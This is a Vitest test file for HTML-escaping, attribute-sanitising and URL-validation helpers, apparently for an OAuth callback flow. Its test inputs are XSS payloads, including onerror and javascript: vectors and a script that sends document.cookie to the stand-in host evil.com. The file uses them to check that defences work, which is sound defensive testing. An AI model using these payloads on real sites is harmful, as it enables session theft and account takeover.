import { describe, it, expect } from 'vitest';
import { escapeHtml, sanitizeAttribute, isValidUrl } from '../html.js';

describe('HTML Utilities', () => {
  describe('escapeHtml', () => {
    it('should escape basic HTML special characters', () => {
      const input = '<script>alert("xss")</script>';
      const expected = '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;';
      expect(escapeHtml(input)).toBe(expected);
    });

    it('should escape ampersands', () => {
      expect(escapeHtml('Rock & Roll')).toBe('Rock &amp; Roll');
    });

    it('should escape quotes', () => {
      expect(escapeHtml('Say "hello" and \'goodbye\'')).toBe('Say &quot;hello&quot; and &#39;goodbye&#39;');
    });

    it('should handle empty strings', () => {
      expect(escapeHtml('')).toBe('');
    });

    it('should handle null and undefined', () => {
      expect(escapeHtml(null as any)).toBe('');
      expect(escapeHtml(undefined as any)).toBe('');
    });

    it('should convert numbers to strings and escape', () => {
      expect(escapeHtml(123 as any)).toBe('123');
    });

    it('should handle complex HTML injection attempts', () => {
      const malicious = '<img src=x onerror=alert(1)> <a href="javascript:alert(2)">click</a>';
      const expected = '&lt;img src=x onerror=alert(1)&gt; &lt;a href=&quot;javascript:alert(2)&quot;&gt;click&lt;/a&gt;';
      expect(escapeHtml(malicious)).toBe(expected);
    });

    it('should handle nested HTML tags', () => {
      const input = '<div><span>Hello</span></div>';
      const expected = '&lt;div&gt;&lt;span&gt;Hello&lt;/span&gt;&lt;/div&gt;';
      expect(escapeHtml(input)).toBe(expected);
    });
  });

  describe('sanitizeAttribute', () => {
    it('should remove javascript: URLs', () => {
      const input = 'javascript:alert("xss")';
      const result = sanitizeAttribute(input);
      expect(result).not.toContain('javascript:');
      expect(result).toBe('alert(&quot;xss&quot;)');
    });

    it('should remove event handlers', () => {
      const input = 'onclick=alert(1) onload=alert(2)';
      const result = sanitizeAttribute(input);
      expect(result).not.toContain('onclick=');
      expect(result).not.toContain('onload=');
    });

    it('should handle mixed case event handlers', () => {
      const input = 'onClick=alert(1) OnMouseOver=alert(2)';
      const result = sanitizeAttribute(input);
      expect(result).not.toContain('onClick=');
      expect(result).not.toContain('OnMouseOver=');
    });

    it('should preserve safe URLs', () => {
      const input = 'https://example.com/page?param=value';
      const result = sanitizeAttribute(input);
      expect(result).toBe('https://example.com/page?param=value');
    });

    it('should escape HTML in attributes', () => {
      const input = 'value="<script>alert(1)</script>"';
      const result = sanitizeAttribute(input);
      expect(result).toContain('&lt;script&gt;');
      expect(result).not.toContain('<script>');
    });

    it('should handle empty attributes', () => {
      expect(sanitizeAttribute('')).toBe('');
      expect(sanitizeAttribute(null as any)).toBe('');
      expect(sanitizeAttribute(undefined as any)).toBe('');
    });
  });

  describe('isValidUrl', () => {
    it('should accept valid HTTPS URLs', () => {
      expect(isValidUrl('https://example.com')).toBe(true);
      expect(isValidUrl('https://sub.example.com/path')).toBe(true);
      expect(isValidUrl('https://example.com:8080/path?query=value')).toBe(true);
    });

    it('should accept localhost HTTP URLs', () => {
      expect(isValidUrl('http://localhost')).toBe(true);
      expect(isValidUrl('http://localhost:3000')).toBe(true);
      expect(isValidUrl('http://localhost:8080/callback')).toBe(true);
      expect(isValidUrl('http://127.0.0.1:3000')).toBe(true);
    });

    it('should accept .localhost domains', () => {
      expect(isValidUrl('http://app.localhost')).toBe(true);
      expect(isValidUrl('http://test.localhost:8080')).toBe(true);
    });

    it('should reject non-localhost HTTP URLs', () => {
      expect(isValidUrl('http://example.com')).toBe(false);
      expect(isValidUrl('http://evil.com')).toBe(false);
    });

    it('should reject invalid protocols', () => {
      expect(isValidUrl('ftp://example.com')).toBe(false);
      expect(isValidUrl('javascript:alert(1)')).toBe(false);
      expect(isValidUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    });

    it('should reject malformed URLs', () => {
      expect(isValidUrl('not-a-url')).toBe(false);
      expect(isValidUrl('://missing-protocol')).toBe(false);
      expect(isValidUrl('')).toBe(false);
    });

    it('should handle null and undefined', () => {
      expect(isValidUrl(null as any)).toBe(false);
      expect(isValidUrl(undefined as any)).toBe(false);
    });

    it('should reject URLs with suspicious patterns', () => {
      expect(isValidUrl('https://example.com@evil.com')).toBe(false);
      expect(isValidUrl('https://evil.com/https://good.com')).toBe(true); // This would be valid but suspicious
    });
  });

  describe('Integration Tests', () => {
    it('should handle OAuth callback parameters safely', () => {
      const maliciousCode = '<script>document.location="http://evil.com?"+document.cookie</script>';
      const maliciousState = '"><script>alert(document.domain)</script>';
      
      expect(escapeHtml(maliciousCode)).not.toContain('<script>');
      expect(escapeHtml(maliciousState)).not.toContain('<script>');
      expect(escapeHtml(maliciousCode)).toContain('&lt;script&gt;');
      expect(escapeHtml(maliciousState)).toContain('&quot;&gt;&lt;script&gt;');
    });

    it('should handle OAuth error parameters safely', () => {
      const maliciousError = 'access_denied<img src=x onerror=alert(1)>';
      const maliciousDescription = 'User denied</script><script>alert(2)</script>';
      
      expect(escapeHtml(maliciousError)).not.toContain('<img');
      expect(escapeHtml(maliciousDescription)).not.toContain('</script>');
      expect(escapeHtml(maliciousError)).toContain('&lt;img');
      expect(escapeHtml(maliciousDescription)).toContain('&lt;/script&gt;');
    });

    it('should preserve normal OAuth parameters', () => {
      const normalCode = 'auth_code_12345';
      const normalState = 'random_state_xyz789';
      const normalError = 'invalid_scope';
      
      expect(escapeHtml(normalCode)).toBe(normalCode);
      expect(escapeHtml(normalState)).toBe(normalState);
      expect(escapeHtml(normalError)).toBe(normalError);
    });
  });
});